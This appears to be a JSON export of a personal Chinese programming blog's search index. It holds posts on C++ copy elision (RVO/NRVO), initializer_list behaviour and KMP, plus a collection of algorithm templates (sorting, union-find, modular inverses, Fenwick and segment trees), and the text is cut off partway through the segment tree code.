[{"content":"概念解释 什么是copy elision？什么是RVO？什么是NRVO？\ncopy elision是C++中对于函数返回值的优化机制，可以减少多余的构造/析构操作，提升效率 RVO（return value optimization），返回值优化，是copy elision的一种形式 NRVO（named return value optimization），具名返回值优化，是copy elision的一种形式 一个例子理解copy elision 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 class Obj { public: Obj() { cout \u0026lt;\u0026lt; \u0026#34;Constructed\\n\u0026#34;; } ~Obj() { cout \u0026lt;\u0026lt; \u0026#34;Deconstructed\\n\u0026#34;; } Obj(const Obj\u0026amp; r) { cout \u0026lt;\u0026lt; \u0026#34;Copy constructed\\n\u0026#34;; } Obj(Obj\u0026amp;\u0026amp; r) { cout \u0026lt;\u0026lt; \u0026#34;Move constructed\\n\u0026#34;; } Obj\u0026amp; operator=(const Obj\u0026amp; r) { cout \u0026lt;\u0026lt; \u0026#34;Copy assignment\\n\u0026#34;; return *this; } Obj\u0026amp; operator=(Obj\u0026amp;\u0026amp; r) { cout \u0026lt;\u0026lt; \u0026#34;Move assignment\\n\u0026#34;; return *this; } }; Obj f1() { return Obj(); // RVO } Obj f2() { Obj t; return t; // NRVO } Obj f3() { Obj t; return std::move(t); } int main() { { Obj tmp = f1(); } cout \u0026lt;\u0026lt; \u0026#34;---------------\\n\u0026#34;; { Obj tmp = f2(); } cout \u0026lt;\u0026lt; \u0026#34;---------------\\n\u0026#34;; { Obj tmp = f3(); } return 0; } Q：函数的输出是什么？\n情况1: C++11，关闭copy elision 1 clang++ rvo.cc -std=c++11 -fno-elide-constructors -o rvo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Constructed Move constructed Deconstructed Move constructed Deconstructed Deconstructed --------------- Constructed Move constructed Deconstructed Move constructed Deconstructed Deconstructed --------------- Constructed Move constructed Deconstructed Move constructed Deconstructed Deconstructed 解释：\n没有任何优化，可以发现，出现了一次默认构造，两次移动构造，两次析构（最后一次是tmp的析构，不用在意，下同）\n两次移动构造分别是临时对象移动到返回值，以及返回值移动到tmp\n情况2: C++17，关闭copy elision 1 clang++ rvo.cc -std=c++17 -fno-elide-constructors -o rvo 1 2 3 4 5 6 7 8 9 10 11 12 Constructed Deconstructed --------------- Constructed Move constructed Deconstructed Deconstructed --------------- Constructed Move constructed Deconstructed Deconstructed 解释：\nf1只出现了一次构造，f2和f3多了一次移动构造和析构\nC++17默认实现了RVO，而没有强制要求编译器实现NRVO，因此尽管关闭了copy elision，在RVO情况下，仍然进行了优化\n还可以发现C++17在关闭copy elision时仍然比关闭了copy elision的C++11优化了一次移动构造和析构，优化了返回值移动到tmp的那一次\n情况3: C++11，开启copy elision 1 clang++ rvo.cc -std=c++11 -o rvo 1 2 3 4 5 6 7 8 9 10 Constructed Deconstructed --------------- Constructed Deconstructed --------------- Constructed Move constructed Deconstructed Deconstructed 情况4: C++17，开启copy elision 1 clang++ rvo.cc -std=c++17 -o rvo 1 2 3 4 5 6 7 8 9 10 Constructed Deconstructed --------------- Constructed Deconstructed --------------- Constructed Move constructed Deconstructed Deconstructed 解释：\n当不关闭copy elision时，C++11和C++17的表现是一样的，可以发现当使用了move时，反而产生了负优化，多了临时对象移动到返回值那一次\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-09-25T01:00:00Z","image":"https://unicocn.github.io/p/understand-copy-elision/cover_hu6170f1f82b3711c204643e7d26f97db9_36645_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/understand-copy-elision/","title":"理解 Copy Elision"},{"content":"背景 字符串匹配问题是指对于字符串s和字符串p，查找字符串p在字符串s中出现的位置。\n对于朴素的算法，时间复杂度为O(mn)，一种优化方式是字符串哈希，通过O(n)的预处理，可以O(1)的复杂度判断字符串s中长度为p.size()的子串是否和p相等， 但是哈希的问题在于哈希碰撞带来的不确定性。\nKMP(Knuth-Morris-Pratt)算法可以实现在O(n+m)的时间复杂度下找出字符串p在字符串s中出现的所有位置。\n原理 代码实现 下标从0开始 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 void KMP(std::string\u0026amp; s, std::string\u0026amp; p) { int n = s.size(), m = p.size(); std::vector\u0026lt;int\u0026gt; nxt(m+1); std::vector\u0026lt;int\u0026gt; f(n+1); nxt[1] = 0; int j = 0; for (int i = 2; i \u0026lt;= m; ++i) { while (j \u0026gt; 0 \u0026amp;\u0026amp; p[j] != p[i-1]) j = nxt[j]; if (p[j] == p[i-1]) j++; nxt[i] = j; } j = 0; for (int i = 1; i \u0026lt;= n; ++i) { while ((j == m) || (j \u0026gt; 0 \u0026amp;\u0026amp; p[j] != s[i-1])) j = nxt[j]; if (p[j] == s[i-1]) j ++; f[i] = j; if (f[i] == m) std::cout \u0026lt;\u0026lt; i - m + 1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } for (int i = 1; i \u0026lt;= m; ++i) std::cout \u0026lt;\u0026lt; nxt[i] \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[i == m]; } 下标从1开始 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;cstring\u0026gt; char s[1000002]; char p[1000002]; // 下标从1开始+末尾终结符 void KMP(char* s, char* p) { int n = strlen(s+1); int m = strlen(p+1); std::vector\u0026lt;int\u0026gt; nxt(m+1); std::vector\u0026lt;int\u0026gt; f(n+1); nxt[1] = 0; int j = 0; for (int i = 2; i \u0026lt;= m; ++i) { while (j \u0026gt; 0 \u0026amp;\u0026amp; p[j+1] != p[i]) j = nxt[j]; if (p[j+1] == p[i]) j++; nxt[i] = j; } j = 0; for (int i = 1; i \u0026lt;= n; ++i) { while ((j == m) || (j \u0026gt; 0 \u0026amp;\u0026amp; p[j+1] != s[i])) j = nxt[j]; if (p[j+1] == s[i]) j ++; f[i] = j; if (f[i] == m) std::cout \u0026lt;\u0026lt; i - m + 1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } for (int i = 1; i \u0026lt;= m; ++i) std::cout \u0026lt;\u0026lt; nxt[i] \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[i == m]; } int main() { std::ios::sync_with_stdio(false); std::cin.tie(nullptr); scanf(\u0026#34;%s\u0026#34;, s+1); scanf(\u0026#34;%s\u0026#34;, p+1); KMP(s, p); } Reference: https://www.bilibili.com/video/BV1CY4y14751\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-09-09T01:00:00Z","image":"https://unicocn.github.io/p/understand-kmp/cover_hu5d3189b976991bbaa97ead5a2f977361_753368_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/understand-kmp/","title":"理解 KMP 算法"},{"content":"理解初始化列表 问题引入 阅读下面代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; using namespace std; int main() { vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; tmp{{10, 10}, {20, 20}, {30, 20}}; tmp.push_back({1, 2, 3}); // works auto list = {1, 2, 3, 4, 5}; tmp.emplace_back(list); // works // tmp.emplace_back({1, 2, 3, 4, 5}); // error vector\u0026lt;int\u0026gt; v = {1, 2, 3}; v = {1, 2, 3}; vector\u0026lt;int\u0026gt;a{1, 2, 3}; return 0; } Insights:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; using namespace std; int main() { std::vector\u0026lt;std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;, std::allocator\u0026lt;std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt; \u0026gt; \u0026gt; tmp = std::vector\u0026lt;std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;, std::allocator\u0026lt;std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt; \u0026gt; \u0026gt;{std::initializer_list\u0026lt;std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt; \u0026gt;{std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;{std::initializer_list\u0026lt;int\u0026gt;{10, 10}, std::allocator\u0026lt;int\u0026gt;()}, std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;{std::initializer_list\u0026lt;int\u0026gt;{20, 20}, std::allocator\u0026lt;int\u0026gt;()}, std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;{std::initializer_list\u0026lt;int\u0026gt;{30, 20}, std::allocator\u0026lt;int\u0026gt;()}}, std::allocator\u0026lt;std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt; \u0026gt;()}; tmp.push_back(std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;{std::initializer_list\u0026lt;int\u0026gt;{1, 2, 3}, std::allocator\u0026lt;int\u0026gt;()}); std::initializer_list\u0026lt;int\u0026gt; list = std::initializer_list\u0026lt;int\u0026gt;{1, 2, 3, 4, 5}; tmp.emplace_back\u0026lt;std::initializer_list\u0026lt;int\u0026gt; \u0026amp;\u0026gt;(list); std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt; v = std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;{std::initializer_list\u0026lt;int\u0026gt;{1, 2, 3}, std::allocator\u0026lt;int\u0026gt;()}; v.operator=(std::initializer_list\u0026lt;int\u0026gt;{1, 2, 3}); std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt; a = std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;{std::initializer_list\u0026lt;int\u0026gt;{1, 2, 3}, std::allocator\u0026lt;int\u0026gt;()}; return 0; } 为什么tmp.emplace_back({1, 2, 3, 4, 5})会Error？\n理解初始化列表 首先对于上面这个问题，不理解的点在于：\n{1, 2, 3} 是一个 initializer_list vector有参数为initializer_list的构造参数 同时 vector v({1, 2, 3}) 是可以的 那么我们使用emplace_back将{1, 2, 3}作为 args 完美转发给vector的构造函数为什么会报错？ 解释见 https://en.cppreference.com/w/cpp/language/list_initialization#Notes\n简单来说，{1, 2, 3}不是一个expression，因此也没有类型，decltype({1, 2}) is ill-formed 因此Args类型推断会无效，因此v.emplace_back({1, 2, 3})不会生效 为什么 auto x = {1, 2, 3}，x的类型会被推断为initializer_list? 答案: 规定的特例 为什么v.push_back({1, 2, 3}) 可以？\n解释见 https://en.cppreference.com/w/cpp/language/overload_resolution#Implicit_conversion_sequence_in_list-initialization\n简单来说，是一种重载的隐式转换,可以将其转换为initializer_list\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-07-15T10:00:00Z","image":"https://unicocn.github.io/p/cpp-understand-initializer-list/cover_hu6170f1f82b3711c204643e7d26f97db9_36645_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/cpp-understand-initializer-list/","title":"理解初始化列表"},{"content":"快速排序(Quick Sort) My Version 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void Qsort(vector\u0026lt;int\u0026gt;\u0026amp; a, int l, int r) { int i = l, j = r; int mid = a[(i+j)\u0026gt;\u0026gt;1]; do { while (a[i] \u0026lt; mid) ++i; while (a[j] \u0026gt; mid) --j; if (i \u0026lt;= j) { swap(a[i], a[j]); ++i; --j; } } while (i \u0026lt; j); if (l \u0026lt; j) Qsort(a,l,j); if (i \u0026lt; r) Qsort(a,i,r); } ChatGPT version 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 int partition(vector\u0026lt;int\u0026gt;\u0026amp; arr, int low, int high) { int pivot = arr[high]; int i = low - 1; for (int j = low; j \u0026lt;= high - 1; j++) { if (arr[j] \u0026lt;= pivot) { i++; swap(arr[i], arr[j]); } } swap(arr[i+1], arr[high]); return i+1; } void quickSort(vector\u0026lt;int\u0026gt;\u0026amp; arr, int low, int high) { if (low \u0026lt; high) { int pi = partition(arr, low, high); quickSort(arr, low, pi - 1); quickSort(arr, pi + 1, high); } } 归并排序(Merge Sort) 递归版 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void MergeSort(vector\u0026lt;int\u0026gt;\u0026amp; a, int l, int r) { if (l == r) return; int mid = l + ((r - l) \u0026gt;\u0026gt; 1); MergeSort(a,l,mid); MergeSort(a,mid+1,r); int tmp[a.size()]; // 用vector太慢 int i = l, j = mid+1, k = l; while (i \u0026lt;= mid \u0026amp;\u0026amp; j \u0026lt;= r) tmp[k++] = (a[i] \u0026lt; a[j])?a[i++]:a[j++]; while (i \u0026lt;= mid) tmp[k++] = a[i++]; while (j \u0026lt;= r) tmp[k++] = a[j++]; for (int i = l; i \u0026lt;= r; ++i) a[i] = tmp[i]; return; } 迭代版 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 void merge(vector\u0026lt;int\u0026gt;\u0026amp; arr, int l, int mid, int r) { int* temp = new int[r - l + 1]; int i = l, j = mid + 1, k = 0; while (i \u0026lt;= mid \u0026amp;\u0026amp; j \u0026lt;= r) { if (arr[i] \u0026lt; arr[j]) { temp[k++] = arr[i++]; } else { temp[k++] = arr[j++]; } } while (i \u0026lt;= mid) { temp[k++] = arr[i++]; } while (j \u0026lt;= r) { temp[k++] = arr[j++]; } for (int i = l, k = 0; i \u0026lt;= r; i++, k++) { arr[i] = temp[k]; } delete[] temp; } void MergeSort(vector\u0026lt;int\u0026gt;\u0026amp; arr, int n) { for (int step = 1; step \u0026lt; n; step \u0026lt;\u0026lt;= 1) { for (int i = 0; i \u0026lt; n - step; i += (step \u0026lt;\u0026lt; 1)) { int l = i, mid = i + step - 1, r = min(i + (step \u0026lt;\u0026lt; 1) - 1, n - 1); merge(arr, l, mid, r); } } } 多路归并 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 class Solution { public: ListNode* merge(ListNode* head1, ListNode* head2) { ListNode* dummy_head = new ListNode(); ListNode* pre = dummy_head; ListNode* p1 = head1; ListNode* p2 = head2; while (p1 != nullptr \u0026amp;\u0026amp; p2 != nullptr) { if (p1-\u0026gt;val \u0026lt; p2-\u0026gt;val) { pre-\u0026gt;next = p1; pre = pre-\u0026gt;next; p1 = p1-\u0026gt;next; } else { pre-\u0026gt;next = p2; pre = pre-\u0026gt;next; p2 = p2-\u0026gt;next; } } if (p1 != nullptr) pre-\u0026gt;next = p1; if (p2 != nullptr) pre-\u0026gt;next = p2; return dummy_head-\u0026gt;next; } ListNode* mergeKLists(vector\u0026lt;ListNode*\u0026gt;\u0026amp; lists, int l, int r) { if (l \u0026gt; r) return nullptr; if (l == r) return lists[l]; return merge(mergeKLists(lists, l, (l + r) \u0026gt;\u0026gt; 1), mergeKLists(lists, ((l + r) \u0026gt;\u0026gt; 1) + 1, r)); } ListNode* mergeKLists(vector\u0026lt;ListNode*\u0026gt;\u0026amp; lists) { return mergeKLists(lists, 0, lists.size() - 1); } }; 并查集(Union-Find Set) 路径压缩 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int main() { int n; cin \u0026gt;\u0026gt; n; vector\u0026lt;int\u0026gt; f(n); for (int i = 0; i \u0026lt; n; ++i) f[i] = i; function\u0026lt;int(int)\u0026gt; Find = [\u0026amp;](int x) { return (f[x] == x)?x:f[x] = Find(f[x]); }; function\u0026lt;void(int,int)\u0026gt; Union = [\u0026amp;](int x, int y) { f[Find(x)] = y; }; for (int i = 0; i \u0026lt; n; ++i) { int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; Union(a,b); } return 0; } 路径压缩+按秩合并(To do) 拓扑排序(Topological Sort) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 void topo(int n, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; prerequisites) { vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; adj(n); vector\u0026lt;int\u0026gt; ind(n, 0); for (auto \u0026amp;p : prerequisites) { int x = p[0], y = p[1]; adj[y].push_back(x); ind[x] ++; } queue\u0026lt;int\u0026gt; Q; vector\u0026lt;bool\u0026gt; vis(n, false); for (int p = 0; p \u0026lt; n; ++p) if (ind[p] == 0) { Q.push(p); vis[p] = true; } while (!Q.empty()) { auto cur = Q.front(); Q.pop(); for (auto \u0026amp;nxt : adj[cur]) if (!vis[nxt]) { if (--ind[nxt] == 0) { Q.push(nxt); vis[nxt] = true; } } } } 欧拉筛法求素数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 vector\u0026lt;int\u0026gt; getPrimes(int n) { vector\u0026lt;int\u0026gt; primes; vector\u0026lt;bool\u0026gt; isPrime(n + 1, true); for (int i = 2; i \u0026lt;= n; ++i) { if (isPrime[i]) { primes.push_back(i); } for (int j = 0; j \u0026lt; primes.size() \u0026amp;\u0026amp; i * primes[j] \u0026lt;= n; ++j) { isPrime[i * primes[j]] = false; if (i % primes[j] == 0) break; } } return primes; } 模数逆元 费马小定理求逆元 1 2 3 4 5 6 7 8 9 10 11 12 13 14 /* a^b模mod的快速幂 */ int64_t modpow(int64_t a, int64_t b, int64_t mod) { int64_t res = 1; while (b) { if (b \u0026amp; 1) res = res * a % mod; a = a * a % mod; b \u0026gt;\u0026gt;= 1; } return res; } /* 求a模mod下的逆元 */ int64_t modinv(int64_t a, int64_t mod) { return modpow(a, mod - 2, mod); } 线性逆元求法 阶乘逆元(求0-n阶乘模p的逆元) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 void exPower( int b, int p, int \u0026amp; a, int \u0026amp; k ) { // 扩展欧几里得算法求逆元 if( p == 0 ) { a = 1; k = 0; return; } exPower( p, b % p, k, a ); k -= b / p * a; return; } int inv( int b, int p ) { int a, k; exPower( b, p, a, k ); if( a \u0026lt; 0 ) a += p; return a; } void init( int n ) { Fact[ 0 ] = 1; for( int i = 1; i \u0026lt;= n; ++i ) Fact[ i ] = Fact[ i - 1 ] * i % Mod; INV[ n ] = inv( Fact[ n ], Mod ); // 先求出n!的逆元，也可以用费马小定理求 for( int i = n - 1; i \u0026gt;= 0; --i ) INV[ i ] = INV[ i + 1 ] * ( i + 1 ) % Mod; return; } 连续数字逆元(求1-n模p的逆元) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int n; int p; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; p; vector\u0026lt;int\u0026gt; ans(n + 1); ans[1] = 1; for (int i = 2; i \u0026lt;= n; ++i) ans[i] = static_cast\u0026lt;int\u0026gt;(1LL * (p - p / i) * ans[p % i] % p); for (int i = 1; i \u0026lt;= n; ++i) cout \u0026lt;\u0026lt; ans[i] \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; return 0; } 矩阵快速幂 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; using ll = long long; constexpr ll MOD = 1e9 + 7; int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int n; ll k; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; k; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; a(n, vector\u0026lt;int\u0026gt;(n)); vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res(n, vector\u0026lt;int\u0026gt;(n, 0)); for (int i = 0; i \u0026lt; n; ++i) for (int j = 0; j \u0026lt; n; ++j) cin \u0026gt;\u0026gt; a[i][j]; for (int i = 0; i \u0026lt; n; ++i) res[i][i] = 1; auto getMul = [\u0026amp;](vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; \u0026amp;a, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; \u0026amp;b) { int tmp[n][n]; memset(tmp, 0, sizeof(tmp)); for (int i = 0; i \u0026lt; n; ++i) for (int j = 0; j \u0026lt; n; ++j) for (int k = 0; k \u0026lt; n; ++k) tmp[i][j] = (int)(1LL * tmp[i][j] + 1LL * a[i][k] * b[k][j] % MOD) % MOD; for (int i = 0; i \u0026lt; n; ++i) for (int j = 0; j \u0026lt; n; ++j) a[i][j] = tmp[i][j]; }; while (k) { if (k \u0026amp; 1) getMul(res, a); getMul(a, a); k \u0026gt;\u0026gt;= 1; } for (int i = 0; i \u0026lt; n; ++i) for (int j = 0; j \u0026lt; n; ++j) cout \u0026lt;\u0026lt; res[i][j] \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[j == n-1]; return 0; } KMP 下标从0开始 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 void KMP(std::string\u0026amp; s, std::string\u0026amp; p) { int n = s.size(), m = p.size(); std::vector\u0026lt;int\u0026gt; nxt(m+1); std::vector\u0026lt;int\u0026gt; f(n+1); nxt[1] = 0; int j = 0; for (int i = 2; i \u0026lt;= m; ++i) { while (j \u0026gt; 0 \u0026amp;\u0026amp; p[j] != p[i-1]) j = nxt[j]; if (p[j] == p[i-1]) j++; nxt[i] = j; } j = 0; for (int i = 1; i \u0026lt;= n; ++i) { while ((j == m) || (j \u0026gt; 0 \u0026amp;\u0026amp; p[j] != s[i-1])) j = nxt[j]; if (p[j] == s[i-1]) j ++; f[i] = j; if (f[i] == m) std::cout \u0026lt;\u0026lt; i - m + 1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } for (int i = 1; i \u0026lt;= m; ++i) std::cout \u0026lt;\u0026lt; nxt[i] \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[i == m]; } 下标从1开始 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;cstring\u0026gt; char s[1000002]; char p[1000002]; // 下标从1开始+末尾终结符 void KMP(char* s, char* p) { int n = strlen(s+1); int m = strlen(p+1); std::vector\u0026lt;int\u0026gt; nxt(m+1); std::vector\u0026lt;int\u0026gt; f(n+1); nxt[1] = 0; int j = 0; for (int i = 2; i \u0026lt;= m; ++i) { while (j \u0026gt; 0 \u0026amp;\u0026amp; p[j+1] != p[i]) j = nxt[j]; if (p[j+1] == p[i]) j++; nxt[i] = j; } j = 0; for (int i = 1; i \u0026lt;= n; ++i) { while ((j == m) || (j \u0026gt; 0 \u0026amp;\u0026amp; p[j+1] != s[i])) j = nxt[j]; if (p[j+1] == s[i]) j ++; f[i] = j; if (f[i] == m) std::cout \u0026lt;\u0026lt; i - m + 1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } for (int i = 1; i \u0026lt;= m; ++i) std::cout \u0026lt;\u0026lt; nxt[i] \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[i == m]; } int main() { std::ios::sync_with_stdio(false); std::cin.tie(nullptr); scanf(\u0026#34;%s\u0026#34;, s+1); scanf(\u0026#34;%s\u0026#34;, p+1); KMP(s, p); } 树状数组(Fenwick Tree) Reference: https://www.cnblogs.com/xenny/p/9739600.html\n单点修改 \u0026amp; 区间求和 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 /** * https://www.luogu.com.cn/problem/P3374 */ #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int MAXN = 5e5 + 10; int n, m; long long Tree[MAXN]; int lowbit(int x) { return -x\u0026amp;x; } void add(int x, int v) { while (x \u0026lt;= n) { Tree[x] += v; x += lowbit(x); } } long long query(int x) { long long sum = 0; while (x \u0026gt; 0) { sum += Tree[x]; x -= lowbit(x); } return sum; } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; vector\u0026lt;int\u0026gt; a(n); memset(Tree, 0, sizeof(Tree)); for (int i = 1; i \u0026lt;= n; ++i) { int num; cin \u0026gt;\u0026gt; num; add(i, num); } for (int i = 0; i \u0026lt; m; ++i) { int op, x, y; cin \u0026gt;\u0026gt; op \u0026gt;\u0026gt; x \u0026gt;\u0026gt; y; if (op == 1) { add(x, y); } else { cout \u0026lt;\u0026lt; query(y) - query(x-1) \u0026lt;\u0026lt; endl; } } return 0; } 区间修改 \u0026amp; 区间求和(To Do) 单点修改 \u0026amp; 区间最值(To Do) 线段树(Segment Tree) Reference: https://www.bilibili.com/video/BV1qY411n7Qs\n不带标记线段树 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 /** * https://www.luogu.com.cn/problem/P3374 */ #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int n, m; int a[500010], f[2000010]; inline void BuildTree(int k, int l, int r) { if (l == r) { f[k] = a[l]; return; } int m = (l + r) \u0026gt;\u0026gt; 1; BuildTree(k + k, l, m); BuildTree(k + k + 1, m+1, r); f[k] = f[k + k] + f[k + k + 1]; return; } inline void add(int k, int l, int r, int p, int v) { f[k] += v; if (l == r) return; int m = (l + r) \u0026gt;\u0026gt; 1; if (p \u0026lt;= m) add(k+k,l,m,p,v); else add(k+k+1,m+1,r,p,v); } inline int query(int k, int l, int r, int h, int t) { if (l == h \u0026amp;\u0026amp; r == t) return f[k]; int m = (l + r) \u0026gt;\u0026gt; 1; if (t \u0026lt;= m) return query(k+k,l,m,h,t); else if (h \u0026gt; m) return query(k+k+1,m+1,r,h,t); else return query(k+k,l,m,h,m) + query(k+k+1,m+1,r,m+1,t); } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; for (int i = 1; i \u0026lt;= n; ++i) cin \u0026gt;\u0026gt; a[i]; BuildTree(1,1,n); for (int i = 1; i \u0026lt;= m; ++i) { int op, x, y; cin \u0026gt;\u0026gt; op \u0026gt;\u0026gt; x \u0026gt;\u0026gt; y; if (op == 1) { add(1,1,n,x,y); } else { cout \u0026lt;\u0026lt; query(1,1,n,x,y) \u0026lt;\u0026lt; endl; } } return 0; } 带标记线段树 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 /** * https://www.luogu.com.cn/problem/P3372 */ #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int n, m; long long a[100010], f[400010], ex[400010]; inline void BuildTree(int k, int l, int r) { ex[k] = 0; if (l == r) { f[k] = a[l]; return; } int m = (l + r) \u0026gt;\u0026gt; 1; BuildTree(k + k, l, m); BuildTree(k + k + 1, m+1, r); f[k] = f[k + k] + f[k + k + 1]; return; } /* 单点修改 */ inline void add(int k, int l, int r, int p, int v) { f[k] += v; if (l == r) return; int m = (l + r) \u0026gt;\u0026gt; 1; if (p \u0026lt;= m) add(k+k,l,m,p,v); else add(k+k+1,m+1,r,p,v); } /* 区间修改 */ inline void add2(int k, int l ,int r, int h, int t, int v) { if (l == h \u0026amp;\u0026amp; r == t) { ex[k] += v; return; } f[k] += (t-h+1) * v; int m = (l + r) \u0026gt;\u0026gt; 1; if (t \u0026lt;= m) add2(k+k,l,m,h,t,v); else if (h \u0026gt; m) add2(k+k+1,m+1,r,h,t,v); else { add2(k+k,l,m,h,m,v); add2(k+k+1,m+1,r,m+1,t,v); } } inline long long query(int k, int l, int r, int h, int t) { if (l == h \u0026amp;\u0026amp; r == t) return f[k]; int m = (l + r) \u0026gt;\u0026gt; 1; if (t \u0026lt;= m) return query(k+k,l,m,h,t); else if (h \u0026gt; m) return query(k+k+1,m+1,r,h,t); else return query(k+k,l,m,h,m) + query(k+k+1,m+1,r,m+1,t); } inline long long query2(int k, int l, int r, int h, int t, long long p) { p += ex[k]; if (l == h \u0026amp;\u0026amp; r == t) return f[k] + p * (r - l + 1); int m = (l + r) \u0026gt;\u0026gt; 1; if (t \u0026lt;= m) return query2(k+k,l,m,h,t,p); else if (h \u0026gt; m) return query2(k+k+1,m+1,r,h,t,p); else return query2(k+k,l,m,h,m,p) + query2(k+k+1,m+1,r,m+1,t,p); } int main() { scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;n,\u0026amp;m); for (int i = 1; i \u0026lt;= n; ++i) scanf(\u0026#34;%lld\u0026#34;,\u0026amp;a[i]); BuildTree(1,1,n); for (int i = 1; i \u0026lt;= m; ++i) { int op; scanf(\u0026#34;%d\u0026#34;,\u0026amp;op); if (op == 1) { int x, y, v; 